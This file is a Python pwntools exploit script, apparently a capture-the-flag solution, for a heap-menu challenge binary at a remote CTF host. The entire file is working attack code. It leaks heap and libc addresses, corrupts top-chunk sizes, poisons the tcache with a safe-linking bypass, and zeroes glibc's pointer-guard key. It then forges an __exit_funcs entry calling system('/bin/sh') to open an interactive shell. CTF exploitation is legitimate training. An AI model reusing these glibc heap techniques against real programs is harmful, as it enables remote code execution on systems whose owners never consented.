from pwn import *

BINARY = "./flaminglips_patched"
HOST = "0.cloud.chals.io"
PORT = 24302

elf = context.binary = ELF(BINARY, checksec=False)
libc = ELF([lib for lib in elf.libs if '/libc.' in lib or '/libc-' in lib][0], checksec=False)

context.log_level = "WARNING"
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P', '-p', '80']
context.gdbinit = "~/.gdbinit_splitmind"
env = {} # {"LD_LIBRARY_PATH": "./", "LD_PRELOAD": ""}
gdbscript = '''
c
'''

def start():
    if args.REMOTE:
        return connect(HOST, PORT)
    elif args.RAW:
        return process(BINARY)
    else:
        return gdb.debug(BINARY, gdbscript=gdbscript, env=env)

def address_from_bytes(by):
    by += b"\x00" * (8 - len(by))
    return u64(by)

def new(index, size, content):
	conn.sendlineafter(b"> ", b"1")
	conn.sendlineafter(b"> ", str(index).encode())
	conn.sendlineafter(b"> ", str(size).encode())
	conn.sendlineafter(b"> ", content)

def delete(index):
	conn.sendlineafter(b"> ", b"2")
	conn.sendlineafter(b"> ", str(index).encode())

def edit(index, content):
	conn.sendlineafter(b"> ", b"3")
	conn.sendlineafter(b"> ", str(index).encode())
	conn.sendlineafter(b"> ", content)

def view(index):
	conn.sendlineafter(b"> ", b"4")
	conn.sendlineafter(b"> ", str(index).encode())

conn = start()

conn.recvuntil(b"Heap leak: ")
leak = conn.recvline()[2:-1].decode()
heap = int(leak, base=16) - 0x2a0
print(f"heap @ {hex(heap)}")

top_size = 0x20d51

size_2 = top_size - 0x10 - (2 * 0x10) - 0xa0;
size_2 &= 0xfff

print(f"size_2: {hex(size_2)}")

heap_ptr = new(0, size_2, b"");

payload = b"A" * (size_2 + 7)
payload += p64(0xc1)

edit(0, payload)

freed_top_size = 0xa0

size_3 = (0x1000 - (2 * 0x10) - 0xb0)
print(f"size_3: {hex(size_3)}")

new(1, size_3, b"CRIB")

payload = b"A" * (size_3 + 8)
payload += p64(0xc1)

edit(1, payload)
new(2, size_3, b"CRIB2")

"""payload = b"A" * (size_3 + 8 - 0x500)
payload += p64(0x561)

edit(2, payload)
new(3, size_3 - 0x500, b"CRIB2")"""  # 0x43aa0

payload = b"A" * (size_3 + 8)
payload += p64(0xa1)
payload += p64((heap + 0x10) ^ ((heap >> 12) + 0x21))

edit(1, payload)

new(3, 0x98, b"AAAA")
new(4, 0x98, b"")

payload = b"\x04\x00" * 0x40
payload += p64(heap + 0x90)
payload += p64(heap + 0x2c0)

edit(4, payload)

new(5, 0x28, b"")
delete(0)

view(5)
leak = address_from_bytes(conn.recvline()[0:6])
libc.address = leak - libc.sym.main_arena - 96
print(f"libc @ {hex(libc.address)}")

# key: -0x2890
# exit_funcs: __exit_funcs

new(6, 0x18, p64(heap + 0x90) + p64(libc.address - 0x2890))

payload = p64(0)

new(7, 0x28, payload)
new(8, 0x18, p64(libc.sym.__exit_funcs))

new(9, 0x18, p64(heap + 0x21010))

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v):
    return p64(rol(v, 0x11, 64))

edit(2, b"/bin/sh\x00")

onexit_fun = p64(0) + p64(1) + p64(4) + encrypt(libc.sym['system']) + p64(heap + 0x43010) + p64(0) + b"deadbeef"
edit(1, onexit_fun)

conn.interactive()